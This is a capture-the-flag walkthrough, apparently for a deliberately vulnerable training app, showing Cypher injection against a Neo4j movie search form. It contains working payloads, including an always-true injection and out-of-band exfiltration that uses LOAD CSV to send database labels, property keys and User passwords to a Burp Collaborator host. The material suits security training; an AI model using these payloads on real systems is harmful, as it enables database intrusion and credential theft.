## Neo4j EASY

<details>
  <summary>Hints</summary>

  1. Can you modify the request before it gets sent to server?
  2. Can you modify the request so the application displays an error with the cypher query? 
  3. Can you modify the request to include the Cypher equivalent to sql injection's ```x' or 'x'='x```
</details>

<details>
  <summary>Walkthrough</summary>

  1. Browse to the Using Burp or ZAP, intercept request after clicking "go" on Neo4j search page
  2. Edit the request: Change ```person=Tom+Hanks``` to ```person=xxxxx"```
  3. Forward the request
  4. Back in your browser, observe the query in the error message
  5. Send another request and intercept it
  6. Edit the request: Change ```person=Tom+Hanks`` to ```person=Tom+Hanks" or person.name=~".*```
  7. Forward the request
  8. Back in your browser look for the FLAGs
</details>

## Neo4j MEDIUM 

## Neo4j HARD

## Neo4j BONUS  

<details>
  <summary>Hints</summary>

  1. You need your own webserver where you may monitor access logs or  [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) for the BONUS flags
  2. Learn and use [Neo4j's db.labels() and db.propertyKeys() procedures](https://neo4j.com/docs/cypher-manual/current/clauses/call/) to learn what's in this database.
  3. Learn and use [Neo4j's LOAD CSV functionality](https://neo4j.com/developer/guide-import-csv/) to cause Neo4j to make http requests
</details>

<details>
  <summary>More Hints</summary>

You need [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client), which is sadly only available with Burpsuite Pro, or your own webserver where you are able to see HTTP access requests. You could add a basic webserver container to this set up and use that server's IP address and access logs in place of Burp Collaborator.

1. Set your challenge level to Medium

```
person=Christian+Bale"+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2blabel+AS+r+return+person//&search=go
person=Christian+Bale"+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
```

2. Get list of all properties in the database and look for something interesting

```
person=Christian+Bale"+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bpropertyKey+AS+r+return+person//&search=go
person=Christian+Bale"+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
```

3. Try variations of the following payload, replacing LABEL with an actual label and PROPERTY with an actual property from steps 1 & 2. This will tell you what properties go with what labels - if no error is thrown you have a property matched to a label.

```
person=Christian+Bale"})-[role]->(node:LABEL)+RETURN+person,role,node.PROPERTY&role=DIRECTED&search=go
```

For example, this should throw an error

```
person=Christian+Bale"})-[role]->(node:Person)+RETURN+person,role,node.title&role=DIRECTED&search=go
```

And this should not throw an error, but you won't see the data for ```node.title``` because of the code that's printing data to the screen

```
person=Christian+Bale"})-[role]->(node:Movie)+RETURN+person,role,node.title&role=DIRECTED&search=go
```

4. Once you've decided what LABEL and PROPERTY you are interested in, use the following payload, foreach person in the database, replacing LABEL with the label and PROPERTY with the property and watch your collaborator space or your server access logs. 

```
person=Tom+Cruise"})-[role]->(node:LABEL)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.name%2b'/'%2bnode.PROPERTY+AS+r+return+person//&search=go//&role=DIRECTED&search=go

```

For example

```
person=Tom+Cruise"})-[role]->(node:User)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.title%2b'/'%2bnode.password+AS+r+return+person//&search=go//&role=DIRECTED&search=go
```

5. Some of the flags may need to be further figured out.


<details>
  <summary>Exact steps to FLAGS</summary>

You need [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client), which is sadly only available with Burpsuite Pro, or your own webserver where you are able to see HTTP access requests. You could add a basic webserver container to this set up and use that server's IP address and access logs in place of Burp Collaborator.

1. Set your challenge level to Medium

2. Get a list of all labels in the database - you are looking for the ```User``` label.

```
person=Christian+Bale"+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2blabel+AS+r+return+person//&search=go
person=Christian+Bale"+CALL+db.labels()+YIELD+label+LOAD+CSV+FROM+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
```

2. Get list of all properties in the database - you are looking for the ```password``` label. 

```
person=Christian+Bale"+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bpropertyKey+AS+r+return+person//&search=go
person=Christian+Bale"+CALL+db.propertyKeys()+YIELD+propertyKey+LOAD+CSV+from+'https://your.burpcollaboratorurl.com/'%2bpropertyKey+AS+r+return+person//&search=go
```

3. Use the following payloads to get the BONUS flags.

```
person=Tom+Tykwer"})-[role]->(node:User)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.title%2b'/'%2bnode.password+AS+r+return+person//&search=go//&role=DIRECTED&search=go
person=Tom+Cruise"})-[role]->(node:User)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.title%2b'/'%2bnode.password+AS+r+return+person//&search=go//&role=DIRECTED&search=go
person=Tom+Skerritt"})-[role]->(node:User)+LOAD+CSV+from+'https://tebgn3hmme2rnqefb660xa8raig84x.oastify.com/'%2bperson.title%2b'/'%2bnode.password+AS+r+return+person//&search=go//&role=DIRECTED&search=go
```
4. The BONUS^MEDIUM password is base64 encoded 3x. 
5. The BONUS^HARD password is encoded using Ceasar Cipher then converted to asciihex then base64 encoded.
</details>
